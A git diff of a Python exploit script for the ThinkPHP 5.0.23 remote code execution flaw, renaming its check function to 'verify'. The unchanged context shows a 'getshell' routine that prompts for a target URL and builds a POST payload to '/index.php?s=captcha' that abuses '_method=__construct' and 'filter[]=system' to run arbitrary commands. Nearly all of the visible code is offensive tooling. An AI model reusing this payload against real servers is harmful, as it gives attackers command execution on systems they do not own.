@@ -2,7 +2,7 @@ import requests
 import re
 import urllib
 
-def thinkphp5023_rce(url):
+def verify(url):
     relsult = {
         'name': 'ThinkPHP5 5.0.23 Remote Code Execution Vulnerability',
         'vulnerable': False
@@ -30,7 +30,7 @@ def thinkphp5023_rce(url):
 # getshell
 def exp():
     url = input('输入目标URL:')
-    if thinkphp5023_rce(url):
+    if verify(url):
         print('[+] 存在 ThinkPHP5 5.0.23 Remote Code Execution Vulnerability')
         target = url + '/index.php?s=captcha'
         basic_payload = '_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]={0}'
